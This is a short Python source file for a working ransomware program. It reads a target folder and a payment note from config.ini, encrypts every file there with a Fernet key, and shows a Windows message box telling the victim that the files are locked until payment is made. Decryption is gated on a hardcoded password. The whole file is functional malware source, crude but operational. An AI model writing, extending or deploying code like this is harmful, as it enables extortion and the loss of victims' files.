import os

from cryptography.fernet import Fernet

# -- Setting up config
import configparser
config = configparser.ConfigParser()

# Locating config.ini
dir = os.path.dirname(os.path.abspath(__file__))
config_file = f'{dir}\config.ini'

config.read(config_file)

title = config.get('MAIN', 'title')
payment_note = config.get('MAIN', 'payment_note')
path_to_encrypt = config.get('MAIN', 'path_to_encrypt')

os.chdir(path_to_encrypt)
run_dir = os.getcwd()

# -- /Setting up config

# Defs
def encrypt():
    files = []

    for file in os.listdir():
        if file == __file__:
            continue
        if file == "key.key":
            continue
        if file == "decrpyt.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("key.key", "wb") as myKey:
        myKey.write(key)

    for file in files:
        with open(file, "rb") as cur_file:
            contents = cur_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as cur_file:
            cur_file.write(contents_encrypted)

def decrypt():
    files = []
    print("file:", __file__)

    for file in os.listdir():
        if file == "stuff.py":
            continue
        if file == "key.key":
            continue
        if os.path.isfile(file):
            files.append(file)
    print(files)

    with open("key.key", "rb") as key:
        secretkey = key.read()

    password = "Tablecloth"

    user_password = input("Enter the password to get your files back:\n")

    if user_password.lower() == password.lower():
        for file in files:
            with open(file, "rb") as cur_file:
                contents = cur_file.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as cur_file:
                cur_file.write(contents_decrypted)
        print("Your files are back!")
        input()
        os.remove(f"{run_dir}\key.key")
    else:
        print("That's the wrong password")
        input()

# /Defs

# Main loop

desc = f"""
This is important! You're computer just ran what's called a ransomware.

Some or all of your files in {run_dir} have been locked and you need a special key to unlock them.

You will recive the password for this once you {payment_note}
"""


import ctypes  # An included library with Python install.   
ctypes.windll.user32.MessageBoxW(0, desc, title, 0)

decrypt_time = False
       
for file in os.listdir():
    if file == "key.key":
        print(" -- key found! --")
        decrypt_time = True
    
if decrypt_time == True:
    print("Decryption mode activated")
    decrypt()
else:
    print("Encryption mode enabled")
    encrypt()